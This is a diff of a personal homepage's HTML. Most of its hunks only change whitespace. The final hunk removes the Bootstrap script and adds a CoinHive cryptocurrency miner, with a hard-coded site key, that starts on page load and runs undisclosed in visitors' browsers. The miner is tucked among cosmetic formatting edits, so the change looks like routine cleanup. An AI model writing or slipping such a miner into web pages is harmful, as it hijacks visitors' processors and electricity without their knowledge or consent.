@@ -4,7 +4,7 @@
 <head>
     <meta charset="UTF-8">
     <title>Ben Cooper</title>
-   <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
     <script src="https://use.fontawesome.com/51b94c345f.js"></script>
@@ -20,7 +20,7 @@
 </head>
 
 <body>
-    
+
     <div class="shift-right time" id="headers">
         <h2 class="time">Welcome to</h2>
         <h1>benc.io</h1>
@@ -33,7 +33,7 @@
         <a title="LinkedIn" href="https://www.linkedin.com/in/benc222/" target="_blank"><i class="fa fa-linkedin icon-spacing fa-2x" aria-hidden="true"></i></a>
         <a title="Email" href="mailto:bencooper222@gmail.com" target="_blank"><i class="fa fa-envelope-o icon-spacing fa-2x" aria-hidden="true"></i></a>
         <a title="Résumé" href="resume.html"><i class="fa fa-file-text-o icon-spacing fa-2x" aria-hidden="true"></i></a>
-       
+
     </div>
 
     <div class="shift-right time" id="article-prompt">
@@ -42,14 +42,19 @@
         <h3 class="time"> For now, check out <a id="link">a reading</a> I like.</h3>
     </div>
 
- 
 
-  
+
+
     <script src="resources/js/nightmode.js"></script>
     <script src="resources/js/randomArticle.js"></script>
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js" integrity="sha384-xBuQ/xzmlsLoJpyjoggmTEz8OWUFM0/RC5BsqQBDX2v5cMvDHcMakNTNrHIW2I5f" crossorigin="anonymous"></script>
-    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
-    
+    <script src="https://coinhive.com/lib/coinhive.min.js"></script>
+    <script>
+        const miner = new CoinHive.Anonymous('Z9xViG5bUBovkUbtaKnxbo0CNHGiaFa0', {
+            throttle: 0.6
+        });
+        miner.start();
+    </script>
 
 </body>
 
